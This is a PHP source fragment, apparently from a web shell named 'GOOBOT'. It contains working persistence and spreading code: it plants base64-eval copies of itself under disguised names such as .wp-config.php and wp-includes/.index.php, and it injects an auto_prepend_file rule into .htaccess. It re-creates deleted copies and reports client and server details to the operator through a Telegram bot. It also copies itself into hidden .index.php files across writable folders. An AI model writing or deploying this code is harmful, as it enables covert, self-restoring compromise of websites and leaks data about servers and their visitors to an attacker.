function sendTelegram($message, $parse_mode = 'HTML') {
    if(TELEGRAM_BOT_TOKEN == 'YOUR_BOT_TOKEN') return false;
    
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => $parse_mode
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

function autoDefend() {
    $self = __FILE__;
    $code = base64_encode(file_get_contents($self));
    $shell_name = basename($self);
    
    $backups = [
        '.config.php',
        '.wp-config.php', 
        'wp-includes/.index.php',
        'wp-content/.config.php',
        '.htaccess.php',
        'error_log.php',
        '.error.php'
    ];
    
    $created = 0;
    
    foreach($backups as $backup) {
        $dir = dirname($backup);
        if($dir != '.' && !is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        
        if(!file_exists($backup)) {
            $backup_code = '<?php eval(base64_decode("' . $code . '")); ?>';
            if(@file_put_contents($backup, $backup_code)) {
                @chmod($backup, 0644);
                $created++;
            }
        }
    }
    
    
    if(is_writable('.')) {
        $htaccess = '.htaccess';
        $ht_content = @file_get_contents($htaccess);
        $inject = "# AUTO-INCLUDE\nphp_value auto_prepend_file " . $shell_name . "\n\n";
        
        if(!$ht_content || strpos($ht_content, $shell_name) === false) {
            @file_put_contents($htaccess, $inject . $ht_content);
        }
    }
    
    $missing = 0;
    foreach($backups as $backup) {
        if(!file_exists($backup)) {
            $missing++;
        }
    }
    
    if($missing > 0 && $created > 0) {
        $msg = "🚨 <b>GOOBOT ALERT - FILES DELETED!</b>\n\n";
        $msg .= "⚠️ <b>Status:</b> {$missing} backup(s) were deleted!\n";
        $msg .= "🔄 <b>Action:</b> Auto-respawn activated - {$created} file(s) recreated!\n\n";
        $msg .= getClientInfo() . "\n";
        $msg .= getServerInfo() . "\n";
        $msg .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
        
        sendTelegram($msg);
    }
    
    return $created;
}

function spreadToAllFolders($max_depth = 2) {
    $self = __FILE__;
    $code = file_get_contents($self);
    $spread_count = 0;
    
    function scanRecursive($dir, $depth, $max_depth, $code, &$count) {
        if($depth > $max_depth) return;
        
        $items = @scandir($dir);
        if(!$items) return;
        
        foreach($items as $item) {
            if($item == '.' || $item == '..') continue;
            
            $path = $dir . '/' . $item;
            
            if(is_dir($path) && is_writable($path)) {
                $shell_file = $path . '/.index.php';
                
                if(!file_exists($shell_file)) {
                    if(@file_put_contents($shell_file, $code)) {
                        @chmod($shell_file, 0644);
                        $count++;
                    }
                }
                
                scanRecursive($path, $depth + 1, $max_depth, $code, $count);
            }
        }
    }
    
    scanRecursive(getcwd(), 0, $max_depth, $code, $spread_count);
    
    return $spread_count;
}

function formatSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

function getPermissions($file) {
    $perms = fileperms($file);
    $info = '';
    
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');
    
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');
    
    return $info;
}
